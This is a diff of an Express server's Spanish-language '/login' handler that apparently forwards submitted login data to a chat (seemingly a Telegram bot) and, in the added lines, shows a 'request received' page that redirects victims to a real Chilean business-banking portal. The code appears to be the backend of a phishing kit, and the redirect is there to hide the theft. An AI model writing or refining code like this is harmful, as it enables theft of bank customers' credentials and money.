@@ -27,14 +27,28 @@ app.post("/login", async (req, res) => {
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
 
-    res.send("✅ Hemos recibido tu solicitud.");
+    // Enviar respuesta HTML con mensaje y redirección
+    res.send(`
+      <!DOCTYPE html>
+      <html lang="es">
+      <head>
+        <meta charset="UTF-8">
+        <title>Solicitud recibida</title>
+        <meta http-equiv="refresh" content="3;url=https://empresas.officebanking.cl">
+      </head>
+      <body>
+        <p>✅ Hemos recibido tu solicitud.</p>
+      </body>
+      </html>
+    `);
   } catch (error) {
     console.error(error);
     res.status(500).send("❌ Error al ingresar tus datos. Inténtalo nuevamente");
   }
 });
 
-// Render asigna automáticamente el puerto
+// Iniciar servidor
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
-
+app.listen(PORT, () => {
+  console.log(`Servidor corriendo en puerto ${PORT}`);
+});
